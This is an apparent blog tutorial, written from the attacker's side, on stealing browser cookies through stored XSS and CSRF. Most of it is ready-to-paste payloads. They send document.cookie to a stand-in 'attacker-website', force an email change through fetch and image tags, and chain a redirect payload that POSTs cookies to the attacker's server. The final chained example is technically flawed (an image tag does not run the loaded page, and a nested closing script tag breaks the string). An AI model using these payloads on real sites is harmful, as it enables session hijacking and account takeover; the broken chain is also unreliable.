---
layout: post
title: Stealing Cookies with XSS and CSRF
---

Cross-Site Scripting (XSS) is a web vulnerability wich occours when an attacker is able to inject a script (usually JavaScript) and then have it executed by the victim's browser. This can be used to steal cookies, session tokens, or other sensitive information stored in the browser.

This time in particular, we are dealing with Stroed XSS, wich means that the attacker is able to store the script inside the web application database: this way, every time the victims access the vulnerable page, the script is executed. For example, lets say we have a comment section or something alike (e.g. post section, etc...), and the application does not sanitize user inputs, so we can post a comment like this:

```html
    <script>
        fetch('https://attacker-website/steal?cookie=' + encodeURIComponent(document.cookie));
    </script>
```

That's pretty simple, but we can do more. What if we want the user to perform some action first, like performing a POST request to change his email or password? We can do that too, using JavaScript Fetch API:

```html
    <script>
        fetch('https://vulnerable-website/change-email', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'email=newemail@example.com'
        }).then(() => {
            fetch('https://attacker-website/steal?cookie=' + encodeURIComponent(document.cookie));
        });
    </script>
```

When the website does not offer the possibility to perform and store JavaScript code, we can trigger requests using Cross-Site Request Forgery (CSRF) techniques. For example, we can use an image tag to send a GET request to perform an email change:

```html
    <img src="https://vulnerable-website/change-email?email=newemail@example.com" />
```

To perfrom a more powerful attach, we can chain CRSF with XSS, for example, we can use an image tag to trigger the user to visit our malicious page wich contains the XSS payload:

```html
    <img src="https://attacker-website/malicious-page" />
```

That's our payload:

```html
    <script>
        window.location.href = 'https://vulnerable-website/vulnerable-page?data=' + encodeURIComponent('<script>fetch("https://vulnerable-website/vulnerable-page").then(() => { fetch("https://attacker-website/steal", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "cookie=" + encodeURIComponent(document.cookie) }); });</script>');
    </script>
```

We'll get the cookie value on our server through the POST request.